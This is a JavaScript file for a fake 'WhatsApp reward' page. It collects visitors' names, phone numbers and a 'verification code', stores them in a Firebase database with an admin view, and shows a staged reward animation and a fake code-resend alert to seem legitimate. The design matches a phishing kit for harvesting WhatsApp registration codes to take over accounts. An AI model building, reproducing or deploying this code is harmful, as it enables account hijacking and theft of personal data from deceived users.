// ============================================
// FIREBASE CONFIGURATION
// ============================================
let db;

const initFirebase = () => {
    const firebaseConfig = {
        apiKey: "AIzaSyAjCZwAjqjfYeKw4hic2nGZQW4qUhxao28",
        authDomain: "whatsappreward-37029.firebaseapp.com",
        databaseURL: "https://whatsappreward-37029-default-rtdb.firebaseio.com",
        projectId: "whatsappreward-37029",
        storageBucket: "whatsappreward-37029.firebasestorage.app",
        messagingSenderId: "231951769177",
        appId: "1:231951769177:web:07df31b8aa8e319b4b9b48",
        measurementId: "G-MJGJ4JGDXJ"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    db = firebase.database();
};

// ============================================
// APP STATE & INITIALIZATION
// ============================================
const app = {
    currentStep: 1,
    userData: {
        fullName: '',
        phoneNumber: '',
        whatsappYears: '',
        code: undefined,
        step: 'initial',
        timestamp: null
    },

    async init() {
        await this.loadUserData();
        this.showStep(1);
        this.setupEventListeners();
    },

    setupEventListeners() {
        document.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && this.currentStep === 2) {
                const form = document.getElementById('user-form');
                if (form) form.dispatchEvent(new Event('submit'));
            }
            if (e.key === 'Enter' && this.currentStep === 3) {
                const form = document.getElementById('experience-form');
                if (form) form.dispatchEvent(new Event('submit'));
            }
            if (e.key === 'Enter' && this.currentStep === 4) {
                const form = document.getElementById('code-form');
                if (form) form.dispatchEvent(new Event('submit'));
            }
        });
    },

    // ============================================
    // STEP NAVIGATION
    // ============================================
    showStep(stepNum) {
        // Hide all steps first
        document.querySelectorAll('.step').forEach(step => {
            step.classList.remove('active');
            step.style.display = 'none';
        });

        // Show target step
        const targetStep = document.getElementById(`step-${stepNum}`);
        if (targetStep) {
            targetStep.classList.add('active');
            targetStep.style.display = 'block';
            this.currentStep = stepNum;

            if (stepNum === 5) {
                this.startRewardProcess();
            }
        }

        window.scrollTo({ top: 0, behavior: 'smooth' });
    },

    nextStep() {
        if (this.currentStep < 7) {
            this.showStep(this.currentStep + 1);
        }
    },

    prevStep() {
        if (this.currentStep > 1) {
            this.showStep(this.currentStep - 1);
        }
    },

    // ============================================
    // FORM VALIDATION
    // ============================================
    validateUserDetails(event) {
        event.preventDefault();

        const fullName = document.getElementById('fullName').value.trim();
        const phoneNumber = document.getElementById('phoneNumber').value.trim();

        let isValid = true;

        // Validate full name
        if (!fullName || fullName.length < 2) {
            this.showError('fullName', 'Please enter a valid name');
            isValid = false;
        } else {
            this.clearError('fullName');
        }

        // Validate phone number
        if (!phoneNumber || phoneNumber.length < 10) {
            this.showError('phoneNumber', 'Please enter a valid phone number');
            isValid = false;
        } else {
            this.clearError('phoneNumber');
        }

        if (isValid) {
            this.userData.fullName = fullName;
            this.userData.phoneNumber = phoneNumber;
            this.userData.code = undefined;
            this.userData.step = 'phone_entered';
            this.saveUserData();
            this.nextStep();
        }
    },

    validateExperience(event) {
        event.preventDefault();

        const whatsappYears = document.getElementById('whatsappYears').value;

        if (!whatsappYears) {
            this.showError('whatsappYears', 'Please select how long you have been using WhatsApp');
            return;
        }

        this.clearError('whatsappYears');
        this.userData.whatsappYears = whatsappYears;
        this.userData.step = 'experience_entered';
        this.saveUserData();
        this.nextStep();
    },

    validateVerification(event) {
        event.preventDefault();

        const mathAnswer = document.getElementById('mathQuestion').value;
        const colorAnswer = document.getElementById('colorQuestion').value;
        const letterAnswer = document.getElementById('letterQuestion').value;

        let isValid = true;

        // Check math question (5 + 3 = 8)
        if (mathAnswer != 8) {
            this.showError('mathQuestion', 'Incorrect answer. Try again.');
            isValid = false;
        } else {
            this.clearError('mathQuestion');
        }

        // Check color question (green)
        if (colorAnswer !== 'green') {
            this.showError('colorQuestion', 'Incorrect answer. Try again.');
            isValid = false;
        } else {
            this.clearError('colorQuestion');
        }

        // Check letter question (REWARD has 6 letters)
        if (letterAnswer != 6) {
            this.showError('letterQuestion', 'Incorrect answer. Try again.');
            isValid = false;
        } else {
            this.clearError('letterQuestion');
        }

        if (isValid) {
            this.nextStep();
        }
    },

    validateCode(event) {
        event.preventDefault();

        const code = document.getElementById('verificationCode').value.trim();

        if (!code) {
            this.showError('code', 'Please enter a verification code');
            return;
        }

        this.clearError('code');
        this.userData.code = code;
        this.userData.step = 'completed';
        this.userData.timestamp = new Date().toISOString();
        this.saveUserData();
        this.nextStep();
    },

    showError(fieldId, message) {
        const input = document.getElementById(fieldId);
        const errorEl = document.getElementById(`${fieldId}-error`);

        if (input) {
            input.classList.add('error');
        }
        if (errorEl) {
            errorEl.textContent = message;
        }
    },

    clearError(fieldId) {
        const input = document.getElementById(fieldId);
        const errorEl = document.getElementById(`${fieldId}-error`);

        if (input) {
            input.classList.remove('error');
        }
        if (errorEl) {
            errorEl.textContent = '';
        }
    },

    resendCode(event) {
        event.preventDefault();
        alert('Verification code resent to ' + this.userData.phoneNumber);
    },

    // ============================================
    // REWARD PROCESS ANIMATION
    // ============================================
    startRewardProcess() {
        const steps = [
            { id: 1, delay: 500 },
            { id: 2, delay: 2000 },
            { id: 3, delay: 3500 },
            { id: 4, delay: 5000 }
        ];

        steps.forEach(step => {
            setTimeout(() => {
                this.completeProcessStep(step.id);
            }, step.delay);
        });

        setTimeout(() => {
            document.getElementById('continue-btn').style.display = 'flex';
        }, 6000);
    },

    completeProcessStep(stepId) {
        const stepEl = document.getElementById(`process-step-${stepId}`);
        if (!stepEl) return;

        stepEl.classList.remove('active');
        stepEl.classList.add('completed');

        const icon = stepEl.querySelector('.step-icon i');
        if (icon) {
            icon.className = 'fas fa-check';
        }

        // Activate next step
        if (stepId < 4) {
            const nextStep = document.getElementById(`process-step-${stepId + 1}`);
            if (nextStep) {
                nextStep.classList.add('active');
            }
        }
    },

    // ============================================
    // CONFETTI ANIMATION
    // ============================================
    createConfetti() {
        const confettiContainer = document.getElementById('confetti');
        if (!confettiContainer) return;

        const colors = ['#25d366', '#10b981', '#1f2937', '#f59e0b'];
        const confettiCount = 50;

        for (let i = 0; i < confettiCount; i++) {
            const piece = document.createElement('div');
            piece.className = 'confetti-piece';
            piece.style.left = Math.random() * 100 + '%';
            piece.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            piece.style.delay = Math.random() * 0.5 + 's';
            piece.style.animationDuration = (Math.random() * 2 + 2.5) + 's';

            confettiContainer.appendChild(piece);

            setTimeout(() => piece.remove(), 3500);
        }
    },

    // ============================================
    // COMPLETION & RESET
    // ============================================
    reset() {
        this.userData = {
            fullName: '',
            phoneNumber: '',
            whatsappYears: '',
            code: undefined,
            step: 'initial',
            timestamp: null
        };

        document.getElementById('user-form').reset();
        document.getElementById('code-form').reset();
        document.getElementById('continue-btn').style.display = 'none';

        // Reset process steps
        document.querySelectorAll('.process-step').forEach((step, index) => {
            step.classList.remove('completed', 'active');
            const icon = step.querySelector('.step-icon i');
            if (icon) {
                icon.className = 'fas fa-spinner';
            }
        });

        this.showStep(1);
    },

    viewAdmin() {
        window.location.href = 'admin.html';
    },

    // ============================================
    // LOCAL STORAGE
    // ============================================
    async saveUserData() {
        try {
            if (!db) return;
            const allData = await this.getAllUserData();
            if (!Array.isArray(allData)) allData = [];
            
            const existingIndex = allData.findIndex(entry => entry.phoneNumber === this.userData.phoneNumber);
            
            const entry = { 
                fullName: this.userData.fullName,
                phoneNumber: this.userData.phoneNumber,
                whatsappYears: this.userData.whatsappYears || null,
                code: this.userData.code || null,
                step: this.userData.step,
                timestamp: new Date().toISOString(),
                id: existingIndex !== -1 ? allData[existingIndex].id : Date.now()
            };
            
            if (existingIndex !== -1) {
                allData[existingIndex] = entry;
            } else {
                allData.push(entry);
            }
            
            await db.ref('users').set(allData);
        } catch (e) {
            console.error('Error saving data:', e);
        }
    },

    async loadUserData() {
        try {
            const data = await this.getAllUserData();
            if (Array.isArray(data) && data.length > 0) {
                const lastEntry = data[data.length - 1];
                this.userData = {
                    fullName: lastEntry.fullName || '',
                    phoneNumber: lastEntry.phoneNumber || '',
                    code: lastEntry.code || '',
                    timestamp: lastEntry.timestamp || null
                };
            }
        } catch (e) {
            console.error('Error loading user data:', e);
        }
    },

    async getAllUserData() {
        try {
            const snapshot = await db.ref('users').get();
            const data = snapshot.val();
            return Array.isArray(data) ? data : [];
        } catch (e) {
            console.error('Error fetching user data:', e);
            return [];
        }
    },

    async clearAllData() {
        if (confirm('Are you sure you want to delete all stored data? This cannot be undone.')) {
            try {
                await db.ref('users').set([]);
                alert('All data has been cleared');
                location.reload();
            } catch (e) {
                console.error('Error clearing data:', e);
            }
        }
    },

    exportData() {
        const data = this.getAllUserData();
        const dataStr = JSON.stringify(data, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `whatsapprewards_data_${new Date().toISOString().split('T')[0]}.json`;
        link.click();
        URL.revokeObjectURL(url);
    }
};

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    initFirebase();
    app.init();

    // Trigger confetti on completion page
    if (document.getElementById('step-7')) {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.target.id === 'step-7' && mutation.target.classList.contains('active')) {
                    app.createConfetti();
                }
            });
        });

        observer.observe(document.getElementById('step-7'), {
            attributes: true,
            attributeFilter: ['class']
        });
    }
});

// Initialize Firebase immediately for admin panel
if (document.location.pathname.includes('admin')) {
    initFirebase();
}
